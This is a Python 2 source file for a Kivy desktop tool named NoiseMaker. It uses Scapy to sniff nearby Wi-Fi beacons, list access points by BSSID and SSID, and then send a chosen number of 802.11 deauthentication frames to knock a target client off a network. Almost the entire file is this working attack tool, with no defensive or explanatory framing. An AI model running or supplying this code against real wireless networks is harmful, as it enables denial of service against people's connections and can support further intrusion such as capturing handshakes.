import sys
from scapy.all import *
from dns.rdatatype import NULL
#from netifaces import interfaces
import threading
import time
import kivy
kivy.require("1.9.0")
from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.config import Config
from kivy.clock import Clock
#Set Window size
Config.set('graphics','height','500')
Config.set('graphics','width','1000')
Config.set('graphics','resizable','0')

class NoiseMakerFunc(FloatLayout):
    
    def outputPacket (self,sendiface,nssid,client, packet):
        sendp(packet)
        #self.ids.resultOutput.text += ' Deauth sent via: ' + sendiface + ' to BSSID: ' + nssid + ' for Client: ' + client + "\n"
        #print 'Deauth sent via: ' + sendiface + ' to BSSID: ' + nssid + ' for Client: ' + client + "\n"
        return
    
    def outputPrintPacket(self, nssid, sendiface, client, packet):
        self.ids.resultOutput.text += 'Deauth sent via: ' + sendiface + ' to BSSID: ' + nssid + ' for Client: ' + client + "\n"
        #print 'Deauth sent via: ' + sendiface + ' to BSSID: ' + nssid + ' for Client: ' + client + "\n"
        sendp(packet)
        return        
    
    def SendPacket (self):  
        try:
            client = str(self.ids.target.text)
            nssid = str(self.ids.ssid.text)
            count = self.ids.decount.text
            conf.iface = str(self.ids.iface.text)
            sendiface = conf.iface
            conf.verb = 0
            
            packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=nssid,addr3=nssid)/Dot11Deauth(reason=7)
            #threads = []
            for n in range(int(count)):
                try:
                    #sendp(packet)
                    #print interfaces()
                    #t = threading.Thread(target=self.outputPacket, args=(conf.iface,nssid,client,packet))
                    #s = threading.Thread(target=self.outputPrintPacket, args=(sendiface,nssid,client))
                    #threads.append(t)
                    #t.start()
                    #s.start()
                    Clock.schedule_once(self.outputPrintPacket(nssid,sendiface,client,packet))

                    #print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + nssid + ' for Client: ' + client
                    #self.ids.resultOutput.text = 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + nssid + ' for Client: ' + client
                except Exception, d:
                    print d
        except Exception, c:
            self.ids.resultOutput.text = "Error"
            print c
            

    def ScanTarget (self):
        intface = str(self.ids.scaniface.text)
        amount = int(self.ids.scanamount.text) #amount of packages that will be listened to before 
        target = {}
    
    #sniff(iface=intface, prn=lambda x:x.sprintf("{Dot11Beacon:%Dot11.addr3%:%Dot11Beacon.info%}"), count=1) #Returns the following: FF:FF:FF:FF:FF:FF <ESSID>
        try:
            print "Scanning..."
            self.ids.targetOutput.text = "Scanning..."
            print amount
            print intface
            a = sniff(iface=intface, count=amount) # Stores all the captured information in a. a.addrx for dest and source
        except socket.error, e:
            print "Error, interface does not exist. " + str(e)
            self.ids.targetOutput.text = "Error, interface does not exist. " + str(e)
            return 1
        # use a[9].payload.payload.info for the SSID
    
        for b in a:
            if str(b.summary()).find("Dot11Beacon") and not str(b.addr2) == "None": #Only process the current package if it is a beacon. Also, apparently find tends to just fail at its job.
                #print b.addr2
                try:
                    if str(b.payload.payload.info) is not "":
                        target[b.addr2] = b.payload.payload.info
                except AttributeError, e: #Package was incorrect or no beacon. Removing item from dictionary.
                    print "Corrupt package caught. Skipping."
        print "Choose from these targets:" 
        print target
        d = ""
        for c in target:
            d += c + ":" + target[c] + "\n"
        self.ids.targetOutput.text = d
        return target
                
class NoiseMakerApp(App):

    def build(self):
        return NoiseMakerFunc()
    
NoiseMaker = NoiseMakerApp()
NoiseMaker.run()